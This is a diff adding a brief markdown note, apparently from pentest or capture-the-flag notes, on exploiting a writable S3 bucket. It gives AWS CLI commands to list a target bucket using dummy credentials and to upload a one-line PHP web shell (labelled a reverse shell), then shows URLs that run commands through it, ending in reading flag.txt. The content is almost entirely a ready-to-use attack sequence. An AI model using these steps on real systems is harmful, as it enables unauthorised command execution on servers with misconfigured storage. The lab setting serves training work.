@@ -1,0 +1,38 @@
+---
+title: 'AWS S3 get info'
+desc: 'Getting information from a S3'
+tags: 'awscli,s3'
+---
+
+# An unknown S3 bucket
+
+To interact with S3, the AWS CLI (awscli) is needed. 
+Then it's needed to have dummy configuration.
+
+1. install awscli
+2. aws configure (dummy data)
+3. list the bucket files: endpoint definition is needed
+
+```
+aws s3 --endpoint=http://s3.target.com/ ls s3://target.com/
+```
+
+4. upload a php reverse shell
+
+```
+# php reverse shell : <?php system($_GET['cmd']); ?>
+
+aws s3 --endpoint=http://s3.target.com/ cp ./shell.php s3://target.com/
+```
+
+5. Execute reverse shell through URL
+
+It's possible to use Burp repeater: intercept the request and send it to repeater, 
+then modify the parameters and send the requests.
+
+```
+http://target.com/shell.php?cmd=ls
+http://target.com/shell.php?cmd=ls+../
+http://target.com/shell.php?cmd=cat+../flag.txt
+```
+
